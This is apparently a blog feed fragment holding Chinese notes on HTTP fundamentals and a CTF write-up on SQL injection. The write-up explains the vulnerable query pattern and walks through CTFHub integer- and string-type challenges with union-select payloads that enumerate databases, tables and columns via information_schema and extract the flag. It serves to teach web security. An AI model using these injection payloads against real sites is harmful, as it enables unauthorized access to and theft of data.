            "content_html": "<h1 id=\"http原理与实践\"><a class=\"anchor\" href=\"#http原理与实践\">#</a> http 原理与实践</h1>\n<h2 id=\"经典五层模型\"><a class=\"anchor\" href=\"#经典五层模型\">#</a> 经典五层模型</h2>\n<p>外链图片转存失败，源站可能有防盗链机制，建议将图片保存下来直接上传<br>\n<img data-src=\"https://img-blog.csdnimg.cn/20200902110538969.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ0NzU4NjQz,size_16,color_FFFFFF,t_70#pic_center\" alt></p>\n<h2 id=\"低三层\"><a class=\"anchor\" href=\"#低三层\">#</a> 低三层</h2>\n<ul>\n<li>物理层主要作用是定义物理设备如何传输数据\n<ul>\n<li>电脑的网卡端口硬件设备</li>\n</ul>\n</li>\n<li>数据链路层在通讯的实体之间建立数据的链路连接</li>\n<li>网络层为数据在节点之间传输创建逻辑链路</li>\n</ul>\n<h2 id=\"传输层\"><a class=\"anchor\" href=\"#传输层\">#</a> 传输层</h2>\n<ul>\n<li>向用户提供可靠的端到端服务</li>\n<li>传输层向更高层屏蔽了下层数据通讯的细节</li>\n</ul>\n<h2 id=\"应用层\"><a class=\"anchor\" href=\"#应用层\">#</a> 应用层</h2>\n<ul>\n<li>为应用软件提供了很多服务</li>\n<li>构建于 tcp 协议之上</li>\n<li>屏蔽网络传输相关细节</li>\n</ul>\n<h2 id=\"http协议发展历史\"><a class=\"anchor\" href=\"#http协议发展历史\">#</a> HTTP 协议发展历史</h2>\n<ul>\n<li>http/0.9\n<ul>\n<li>只有一个命令 get</li>\n<li>没有 header 等描述数据的信息</li>\n<li>服务器发送完毕就关闭 tcp</li>\n</ul>\n</li>\n<li>http/1.0\n<ul>\n<li>增加了很多命令</li>\n<li>增加了 status code 和 header</li>\n<li>多字符集支持，多部分发送，权限，缓存等</li>\n</ul>\n</li>\n<li>http/1.1\n<ul>\n<li>持久连接</li>\n<li>pipeline</li>\n<li>增加 host 和其它一些命令</li>\n</ul>\n</li>\n<li>http2\n<ul>\n<li>所有数据已二进制传输</li>\n<li>同一个连接里面发送多个请求不在需要按照顺序来</li>\n<li>头信息压缩以及推送等提高效率的功能</li>\n</ul>\n</li>\n</ul>\n<h2 id=\"http的三次握手\"><a class=\"anchor\" href=\"#http的三次握手\">#</a> http 的三次握手</h2>\n<p><img data-src=\"https://imgconvert.csdnimg.cn/aHR0cHM6Ly9zMS5heDF4LmNvbS8yMDIwLzA4LzI2L2RmR2lrai5wbmc?x-oss-process=image/format,png\" alt><br>\n客户端发送创建连接</p>\n<p>服务端确认连接</p>\n<p>客户端确认连接 建立连接</p>\n<h2 id=\"uriurlurn\"><a class=\"anchor\" href=\"#uriurlurn\">#</a> URI,URL,URN</h2>\n<ul>\n<li>URI\n<ul>\n<li>Uniform Resource Identifier / 统一资源标识符</li>\n<li>为了定位一个网址具体的某个页面</li>\n<li>用来唯一表示互联网上的信息资源</li>\n<li>包括 URL 和 URN</li>\n</ul>\n</li>\n<li>URL\n<ul>\n<li>Uniform Resource Locator / 统一资源定位器</li>\n<li><span class=\"exturl\" data-url=\"aHR0cDovL3VzZXIlRUYlQkMlOUFwYXNzQGhvc3QuY29tOjgwL3BhdGg/cXVlcnk9c3RyaW5nI2hhc2g=\">http://user：pass@host.com:80/path?query=string#hash</span></li>\n<li>此类格式的都叫 URL，比如 ftp 协议</li>\n</ul>\n</li>\n<li>URN\n<ul>\n<li>永久统一资源定位符</li>\n<li>在移动之后还能被找到</li>\n<li>目前行业没有应用方案</li>\n</ul>\n</li>\n</ul>\n<h2 id=\"http报文\"><a class=\"anchor\" href=\"#http报文\">#</a> http 报文</h2>\n<p><img data-src=\"https://imgconvert.csdnimg.cn/aHR0cHM6Ly9zMS5heDF4LmNvbS8yMDIwLzA4LzI3L2RmeVdoNi5wbmc?x-oss-process=image/format,png\" alt></p>\n<h2 id=\"http方法\"><a class=\"anchor\" href=\"#http方法\">#</a> http 方法</h2>\n<p>用来定义对于资源的操作</p>\n<p>常有的有 get 和 post</p>\n<p>从定义上讲有各自的语义</p>\n<h2 id=\"http-code\"><a class=\"anchor\" href=\"#http-code\">#</a> http code</h2>\n<p>定义服务器对请求的处理结果</p>\n<p>各个区间的 code 有各自的语义</p>\n<p>好的 http 服务可以通过 code 判断结果</p>\n<h2 id=\"cors预请求\"><a class=\"anchor\" href=\"#cors预请求\">#</a> CORS 预请求</h2>\n<ul>\n<li>在 cors 的限制\n<ul>\n<li>只有 get，head ，post 方法其他的需要用一个方法去验证</li>\n<li>允许 Content-Type\n<ul>\n<li>text/plain</li>\n<li>multipart/form-data</li>\n<li>application/x-www-form-urlencoded</li>\n</ul>\n</li>\n</ul>\n</li>\n<li>其他的限制\n<ul>\n<li>请求头的限制</li>\n<li>XMLHttpRequesUpload 对象均没有任何事件监听器</li>\n<li>请求中没有使用 ReadableStream 对象</li>\n</ul>\n</li>\n</ul>\n<h2 id=\"缓存cache-control\"><a class=\"anchor\" href=\"#缓存cache-control\">#</a> 缓存 Cache-Control</h2>\n<ul>\n<li>可缓存性\n<ul>\n<li>public\n<ul>\n<li>任何地方</li>\n</ul>\n</li>\n<li>private\n<ul>\n<li>发起请求的浏览器</li>\n</ul>\n</li>\n<li>no-cache\n<ul>\n<li>谁也不缓存</li>\n</ul>\n</li>\n</ul>\n</li>\n<li>到期\n<ul>\n<li>max-age=\n<ul>\n<li>设置缓存多少秒</li>\n</ul>\n</li>\n<li>s-maxage=\n<ul>\n<li>代理服务器设置缓存多少秒</li>\n</ul>\n</li>\n<li>max-stale\n<ul>\n<li>缓存过期后依然可以使用缓存的时间</li>\n</ul>\n</li>\n</ul>\n</li>\n<li>重新验证\n<ul>\n<li>must-revalidate\n<ul>\n<li>缓存过期后必须去原服务端获取缓存</li>\n</ul>\n</li>\n<li>proxy-revalidate\n<ul>\n<li>用在缓存服务器中，缓存过期后必须去原服务端获取缓存</li>\n</ul>\n</li>\n<li>其他\n<ul>\n<li>no-store\n<ul>\n<li>本地可以存缓存带必须服务器验证后才能用</li>\n</ul>\n</li>\n<li>no-transform\n<ul>\n<li>服务器不要随便改动缓存的内容</li>\n</ul>\n</li>\n</ul>\n</li>\n</ul>\n</li>\n</ul>\n<h2 id=\"资源验证\"><a class=\"anchor\" href=\"#资源验证\">#</a> 资源验证</h2>\n<p><img data-src=\"https://imgconvert.csdnimg.cn/aHR0cHM6Ly9zMS5heDF4LmNvbS8yMDIwLzA4LzI3L2RmV0N0QS5wbmc?x-oss-process=image/format,png\" alt></p>\n<ul>\n<li>验证头\n<ul>\n<li>Last-Modified</li>\n<li>Etag</li>\n</ul>\n</li>\n<li>Last-Modified\n<ul>\n<li>上次修改时间</li>\n<li>配合 If-Modified-Since 或者 If-Unmodified-Since 使用</li>\n<li>对比上次时间验证是否需要更新</li>\n</ul>\n</li>\n<li>Etag\n<ul>\n<li>数据签名</li>\n<li>配合 If-Match 或者 If-Non-Match 使用</li>\n<li>对比资源的签名判断是否使用缓存</li>\n</ul>\n</li>\n</ul>\n<h2 id=\"cookie和session\"><a class=\"anchor\" href=\"#cookie和session\">#</a> Cookie 和 Session</h2>\n<ul>\n<li>Cookie\n<ul>\n<li>通过 Set-Cookie 设置</li>\n<li>下次请求会自动带上</li>\n<li>键值对，可以设置多个</li>\n</ul>\n</li>\n<li>Cookie 属性\n<ul>\n<li>max-age 和 expires 设置过期时间</li>\n<li>Secure 只在 https 的时候发送</li>\n<li>HttpOnly 无法通过 document.cookie 访问</li>\n</ul>\n</li>\n</ul>\n<h2 id=\"http长连接\"><a class=\"anchor\" href=\"#http长连接\">#</a> HTTP 长连接</h2>\n<p>长连接就是请求后一段时间内不会关闭的连接这样下次访问的时候不用进行三次握手</p>\n<h2 id=\"数据协商\"><a class=\"anchor\" href=\"#数据协商\">#</a> 数据协商</h2>\n<p>请求</p>\n<p>返回</p>\n<ul>\n<li>Accept\n<ul>\n<li>Accept\n<ul>\n<li>我想要的数据类型</li>\n</ul>\n</li>\n<li>Accept-Encoding\n<ul>\n<li>我的数据是什么编码方式主要是进行压缩</li>\n</ul>\n</li>\n<li>Accept-Language\n<ul>\n<li>我的数据是什么语言（中文英文等)</li>\n</ul>\n</li>\n<li>User-Agent\n<ul>\n<li>返回的是移动端还是 pc 端</li>\n</ul>\n</li>\n</ul>\n</li>\n<li>Content\n<ul>\n<li>Content-Type\n<ul>\n<li>实际数据的返回格式对应 Accept</li>\n</ul>\n</li>\n<li>Content-Encoding\n<ul>\n<li>数据是什么编码格式对应 Accept-Encoding</li>\n</ul>\n</li>\n<li>Content-Language\n<ul>\n<li>根据你的请求响应语言还是不根据你的请求响应你的语言</li>\n</ul>\n</li>\n</ul>\n</li>\n</ul>\n<h2 id=\"redirect\"><a class=\"anchor\" href=\"#redirect\">#</a> Redirect</h2>\n<p>更新网络资源当服务器的资源改变路径时使用</p>\n<h2 id=\"csp\"><a class=\"anchor\" href=\"#csp\">#</a> csp</h2>\n<ul>\n<li>作用\n<ul>\n<li>限制资源获取</li>\n<li>报告资源获取</li>\n</ul>\n</li>\n<li>限制方式\n<ul>\n<li>default-src 限制全局</li>\n<li>制定资源类型</li>\n</ul>\n</li>\n</ul>\n<h2 id=\"https\"><a class=\"anchor\" href=\"#https\">#</a> https</h2>\n<ul>\n<li>加密\n<ul>\n<li>私钥</li>\n<li>公钥</li>\n</ul>\n</li>\n<li>握手过程<br>\n<img data-src=\"https://imgconvert.csdnimg.cn/aHR0cHM6Ly9zMS5heDF4LmNvbS8yMDIwLzA4LzI3L2RmNHY4QS5wbmc?x-oss-process=image/format,png\" alt></li>\n</ul>\n<h2 id=\"http2\"><a class=\"anchor\" href=\"#http2\">#</a> http2</h2>\n<p>信道复用</p>\n<p>分帧传输</p>\n<p>Server Push</p>\n",
            "tags": []
        },
        {
            "id": "https://mangpumo.github.io/2022/11/10/CTF-Web-SQL%E6%B3%A8%E5%85%A5/",
            "url": "https://mangpumo.github.io/2022/11/10/CTF-Web-SQL%E6%B3%A8%E5%85%A5/",
            "title": "CTF_Web_SQL注入",
            "date_published": "2022-11-10T06:31:21.000Z",
            "content_html": "<h1 id=\"sql注入\"><a class=\"anchor\" href=\"#sql注入\">#</a> SQL 注入</h1>\n<h2 id=\"一-sql注入的基础\"><a class=\"anchor\" href=\"#一-sql注入的基础\">#</a> 一、SQL 注入的基础</h2>\n<h3 id=\"1介绍sql注入\"><a class=\"anchor\" href=\"#1介绍sql注入\">#</a> 1. 介绍 SQL 注入</h3>\n<p>SQL 注入就是指 WEB 应用程序对用户输入数据的合法性没有判断，前端传入后端的参数是攻击者可控的，并且参数代入数据库查询，攻击者可以通过构造不同的 SQL 语句来是实现对数据库的任意操作。</p>\n<p>一般情况下，开发人员可以使用动态 SQL 语句创建通用、灵活的应用。动态 SQL 语句是在执行过程中构造的，他根据不同的条件产生不同的 SQL 语句。当开发人员在运行过程中需要根据不同的查询标准决定提取什么字段 (如 select 语句)，或者根据不同的条件选择不同的查询表时，动态的 SQL 语句会非常有用。</p>\n<p>下面以 PHP 语句为例。<br>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">$query = &quot;SELECT * FROM user WHERE id = $_GET[&#x27;id&#x27;]&quot;;</span><br></pre></td></tr></table></figure><br>\n 由于这里的参数 ID 可控，且带入数据库查询，所以非法用户可以任意拼接 SQL 语句进行攻击。</p>\n<h3 id=\"2sql注入的原理\"><a class=\"anchor\" href=\"#2sql注入的原理\">#</a> 2.SQL 注入的原理</h3>\n<p>SQL 注入漏洞的产生需要满足以下两个条件。<br>\n(1) 参数用户可控：前端传给后端的参数内容是用户可以控制的。<br>\n(2) 参数代入数据库查询：传入的参数拼接到 SQL 语句，且带入数据库查询。<br>\n当传入的 ID 参数为 1 时，数据库执行的代码如下所示。<br>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">select * from users where id = 1&#x27;</span><br></pre></td></tr></table></figure><br>\n 这不符合数据库的语法规范，所以会报错。当传入的 ID 参数为 and 1=1 时，执行的 SQL 语句如下所示。<br>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">select * from users where id=1 and 1=1</span><br></pre></td></tr></table></figure><br>\n 因为 1=1 为真，且 where 语句中 id=1 也为真，所以页面会返回与 id=1 相同的结果。当传入的 ID 参数为 and 1=2 时，由于 1=2 不成立，所以返回假，页面就会返回与 id=1 不同的结果。</p>\n<p>在实际环境中，凡是满足上述两个条件的参数皆可能存在 SQL 注入漏洞，因此开发者需秉承 &quot;外部参数皆不可信的原则&quot; 进行开发。</p>\n<h3 id=\"3与mysql注入相关的知识点\"><a class=\"anchor\" href=\"#3与mysql注入相关的知识点\">#</a> 3. 与 MYSQL 注入相关的知识点</h3>\n<p>在 MYSQL5.0 版本之后，MySQL 默认在数据库中存放一个 &quot;information_schema&quot; 的数据库，在该库中，需要记住三个表名，分别是 SCHEMATA、TABLES 和 COLUMNS。<br>\nSCHEMATA 表存储该用户创建的所有数据库名的库名。<br>\n<img data-src=\"https://img-blog.csdnimg.cn/e3d7354a2e1d41838ead2a3e6cad3de1.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L21fZGVfZw==,size_16,color_FFFFFF,t_70\" alt><br>\nTABLES 表存储该用户创建的所有的数据库的库名和表名，库名为：TABLES_SCHEMA，表名为：TABLE_NAME，字段名为：COLUMN_NAME.</p>\n<h4 id=\"1mysql查询语句\"><a class=\"anchor\" href=\"#1mysql查询语句\">#</a> 1.MySQL 查询语句</h4>\n<p>在不知道任何条件时，语句如下所示.<br>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">select 查询的字段名 from 库名.表名</span><br></pre></td></tr></table></figure><br>\n 在知道一条已知条件时，语句如下所示。<br>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">select 要查询的字段名 from 库名.表名 where 已知条件的字段名=&#x27;已知条件的值&#x27;</span><br></pre></td></tr></table></figure></p>\n<h4 id=\"2limit的用法\"><a class=\"anchor\" href=\"#2limit的用法\">#</a> 2.limit 的用法</h4>\n<p>limit 的使用格式为 limit m,n, 其中 m 是指记录开始的位置，从 0 开始，表示第一条记录；n 是指 n 条记录。例如 limit 0,1 表示从第一条记录开始，取一条记录，不使用 limit 和使用 limit 查询的结果<br>\n<img data-src=\"https://img-blog.csdnimg.cn/38b48240aa594f13ba5be0d3e19a8c00.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L21fZGVfZw==,size_16,color_FFFFFF,t_70\" alt></p>\n<h4 id=\"3需要记住的几个函数\"><a class=\"anchor\" href=\"#3需要记住的几个函数\">#</a> 3. 需要记住的几个函数</h4>\n<p>・database () 当前网站使用的数据库<br>\n・version () 当前 MySQL 的版本<br>\n・user () 当前 MySQL 的用户</p>\n<h4 id=\"4注释符\"><a class=\"anchor\" href=\"#4注释符\">#</a> 4. 注释符</h4>\n<p>在 MySQL 中，常见注释符的表达方式：# 或 -- 空格或 /**/。</p>\n<h4 id=\"5内联注释\"><a class=\"anchor\" href=\"#5内联注释\">#</a> 5. 内联注释</h4>\n<p>内联注释的形式:<br>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">/*!code*/</span><br></pre></td></tr></table></figure><br>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">内联注释可以用于整个sql语句中，用来执行SQL语句</span><br></pre></td></tr></table></figure></p>\n<h2 id=\"二-实战化\"><a class=\"anchor\" href=\"#二-实战化\">#</a> 二、实战化</h2>\n<h3 id=\"1整数型注入\"><a class=\"anchor\" href=\"#1整数型注入\">#</a> 1. 整数型注入</h3>\n<p>1. 根据提示说，试试 1，输入 1 试试<br>\n<img data-src=\"https://img-blog.csdnimg.cn/161f7f4ee90d457b9fe415d9e3792249.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L21fZGVfZw==,size_16,color_FFFFFF,t_70\" alt><br>\n 2. 再输入框中输入 2-1, 查询的结果是 1，说明存在整数型注入<br>\n<img data-src=\"https://img-blog.csdnimg.cn/8a1e28d542584f9f89bf791261a664f8.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L21fZGVfZw==,size_16,color_FFFFFF,t_70\" alt><br>\n 3. 尝试 1 and 1=1 和 1 and 1=2,and 没被过滤<br>\n <figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">1 and 1=1</span><br></pre></td></tr></table></figure><br>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">1 and 1=2</span><br></pre></td></tr></table></figure><br>\n<img data-src=\"https://img-blog.csdnimg.cn/8b2bc9445d3c408c9cb365595d74b1ec.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L21fZGVfZw==,size_16,color_FFFFFF,t_70\" alt><br>\n4. 尝试 1 or 1=1 和 1 or 1=2,or 没被过滤<br>\n <figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">1 or 1=1</span><br></pre></td></tr></table></figure><br>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">1 or 1=2</span><br></pre></td></tr></table></figure><br>\n<img data-src=\"https://img-blog.csdnimg.cn/729d9ced94024acc90b605dc2c9c5b83.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L21fZGVfZw==,size_16,color_FFFFFF,t_70\" alt><br>\n5. 使用 order by 判断列名<br>\n <figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">1 order by 1,2</span><br></pre></td></tr></table></figure><br>\n<img data-src=\"https://img-blog.csdnimg.cn/36b9589074fc411c97663a86aaf60eb3.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L21fZGVfZw==,size_16,color_FFFFFF,t_70\" alt><br>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">1 order by 1,2,3</span><br></pre></td></tr></table></figure><br>\n<img data-src=\"https://img-blog.csdnimg.cn/6b1cf9100a824a2bb2dffb60823f6710.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L21fZGVfZw==,size_16,color_FFFFFF,t_70\" alt><br>\n 经过测试，可以发现有两列</p>\n<p>6. 使用 union select 判断注入点<br>\n <figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">-1 union slect 1,2</span><br></pre></td></tr></table></figure><br>\n<img data-src=\"https://img-blog.csdnimg.cn/a8c40b43e15946a3bbd0412714f403a6.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L21fZGVfZw==,size_16,color_FFFFFF,t_70\" alt><br>\n7. 知道注入点在 2 的位置，爆库<br>\n <figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">-1 union select 1,database()</span><br></pre></td></tr></table></figure><br>\n<img data-src=\"https://img-blog.csdnimg.cn/dd29d16b5f3241078e766af4ebc5713d.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L21fZGVfZw==,size_16,color_FFFFFF,t_70\" alt><br>\n8. 爆库成功，知道库名为:sqli，爆表<br>\n <figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">-1 union select 1,(select table_name from information_schema.tables where table_schema=&#x27;sqli&#x27; limit 0,1)</span><br></pre></td></tr></table></figure><br>\n<img data-src=\"https://img-blog.csdnimg.cn/71ba5f884e2d4309b6133cf6cae2052f.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L21fZGVfZw==,size_16,color_FFFFFF,t_70\" alt><br>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">-1 union select 1,(select table_name from information_schema.tables where table_schema=&#x27;sqli&#x27; limit 1,1)</span><br></pre></td></tr></table></figure><br>\n<img data-src=\"https://img-blog.csdnimg.cn/cced3c5d13994d4891c3b06e971612f6.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L21fZGVfZw==,size_16,color_FFFFFF,t_70\" alt><br>\n9. 爆表成功，知道库名为:news 和 flag，使用 flag 这个表，爆字段名<br>\n <figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">-1 union select 1,(select column_name from information_schema.columns where table_schema=&#x27;sqli&#x27; and table_name=&#x27;flag&#x27; limit 0,1)</span><br></pre></td></tr></table></figure><br>\n<img data-src=\"https://img-blog.csdnimg.cn/98ccfeacfc204a8abc6f9827b0320cc4.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L21fZGVfZw==,size_16,color_FFFFFF,t_70\" alt><br>\n10. 爆表字段名，知道字段名为 flag，使用 flag 这个字段名，爆字段内容<br>\n <figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">-1 union select 1,(select flag from sqli.flag limit 0,1)</span><br></pre></td></tr></table></figure><br>\n<img data-src=\"https://img-blog.csdnimg.cn/366cb552a8374199b4691c2e2bf4d596.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L21fZGVfZw==,size_16,color_FFFFFF,t_70\" alt><br>\n10. 注入成功，得到 flag<br>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">ctfhub&#123;ba713f7270fc403bf7983f6d&#125; </span><br></pre></td></tr></table></figure></p>\n<h3 id=\"2字符型注入\"><a class=\"anchor\" href=\"#2字符型注入\">#</a> 2. 字符型注入</h3>\n<p><img data-src=\"https://img-blog.csdnimg.cn/6bbf7fc25db640deac84bf698bc83bc6.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L21fZGVfZw==,size_16,color_FFFFFF,t_70\" alt><br>\n看到 sql 语句为<br>\n <figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">select * from news where id=&#x27;1&#x27;</span><br></pre></td></tr></table></figure><br>\n 那我们尝试一下，1’判断其字符注入<br>\n<img data-src=\"https://img-blog.csdnimg.cn/b9d06ad27a384d0cb3d9a9b7ecc21eed.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L21fZGVfZw==,size_16,color_FFFFFF,t_70\" alt><br>\n使用 #将后面的单引号注释掉<br>\n <figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">1&#x27;#</span><br></pre></td></tr></table></figure><br>\n<img data-src=\"https://img-blog.csdnimg.cn/0b56d46725294702b3a67de9a16545fa.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L21fZGVfZw==,size_16,color_FFFFFF,t_70\" alt><br>\n 判断 and 是否被过滤<br>\n <figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">1&#x27; and 1=1#</span><br></pre></td></tr></table></figure><br>\n<img data-src=\"https://img-blog.csdnimg.cn/3fb9bc34fad641b9bdd8b917387f95b7.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L21fZGVfZw==,size_16,color_FFFFFF,t_70\" alt><br>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">1&#x27; and 1=2 #</span><br></pre></td></tr></table></figure><br>\n<img data-src=\"https://img-blog.csdnimg.cn/45a831fa9d9442618a991e0ffe3c8437.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L21fZGVfZw==,size_16,color_FFFFFF,t_70\" alt><br>\n 判断 or 是否被过滤<br>\n <figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">1&#x27; or 1=1#</span><br></pre></td></tr></table></figure><br>\n<img data-src=\"https://img-blog.csdnimg.cn/3d64114463db4e42aab1961333da71f0.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L21fZGVfZw==,size_16,color_FFFFFF,t_70\" alt><br>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">1&#x27; or 1=2#</span><br></pre></td></tr></table></figure><br>\n<img data-src=\"https://img-blog.csdnimg.cn/179769310c7c413ead7a836c080fd52a.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L21fZGVfZw==,size_16,color_FFFFFF,t_70\" alt><br>\n 判断列数<br>\n <figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">1&#x27; order by 1,2,3#</span><br></pre></td></tr></table></figure><br>\n<img data-src=\"https://img-blog.csdnimg.cn/6957edfe6ff24ab5aaa7dff5e3594cbc.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L21fZGVfZw==,size_16,color_FFFFFF,t_70\" alt><br>\n 报错，减少一个列<br>\n <figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">1&#x27; order by 1,2#</span><br></pre></td></tr></table></figure><br>\n<img data-src=\"https://img-blog.csdnimg.cn/6753a1227e8242888687db2271bd7f30.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L21fZGVfZw==,size_16,color_FFFFFF,t_70\" alt><br>\n 判断注入点<br>\n <figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">-1&#x27; union select 1,2#</span><br></pre></td></tr></table></figure><br>\n<img data-src=\"https://img-blog.csdnimg.cn/e860bd103cc343b080076670d72eec0d.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L21fZGVfZw==,size_16,color_FFFFFF,t_70\" alt><br>\n 爆库<br>\n <figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">-1&#x27; union select 1,database()#</span><br></pre></td></tr></table></figure><br>\n<img 